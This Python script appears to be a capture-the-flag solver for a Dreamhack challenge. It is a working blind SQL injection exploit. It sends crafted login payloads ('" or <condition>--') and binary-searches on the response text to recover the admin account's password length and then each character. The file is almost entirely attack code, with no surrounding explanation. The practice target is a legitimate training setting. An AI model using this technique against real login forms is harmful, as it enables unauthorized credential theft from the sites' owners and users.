from random import randrange
import sys
from time import sleep
import requests
from urllib.parse import urljoin

'''
blind sql injection (길이 구하기)
'''
class Solver:
    def __init__(self, port: str) -> None:
        self.__chall_url = f"http://host1.dreamhack.games:{port}"
        self.__login_url = urljoin(self.__chall_url, "login")

    def __login(self, userid: str, userpassword: str) -> bool:
        logindata = {
            "userid": userid,
            "userpassword": userpassword
        }
        resp = requests.post(self.__login_url, data=logindata)
        return resp

    def __sqli(self, query: str) -> requests.Response:
        resp = self.__login(f"\" or {query}--", "hi")
        return resp

    def __binary__(self, query_fs: str, l: int, r: int) -> int:
        while 1:
            m = (l + r) // 2

            if l + 1 >= r:
                break

            query = query_fs.format(val = m)

            if "hello" in self.__sqli(query).text:
                r = m
            else:
                l = m

        return m

    def __find(self, user: str, maxlen: int = 100) -> int:
        query = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")<{{val}})"
        pw_len = self.__binary__(query, 0, maxlen)
        print(pw_len)
        pw = ''
        for i in range(1, pw_len + 1):
            query = f"((SELECT SUBSTR(userpassword, {i}, 1) WHERE userid=\"{user}\") < CHAR({{val}}))"

            pw += chr(self.__binary__(query, 0x2f, 0x7e))
        return pw_len, pw

    def solve(self):
        pwlen = self.__find("admin")
        print("len, pw = ", pwlen)

if __name__ == "__main__":
    port = sys.argv[1]
    print(port)
    solver = Solver(port)
    solver.solve()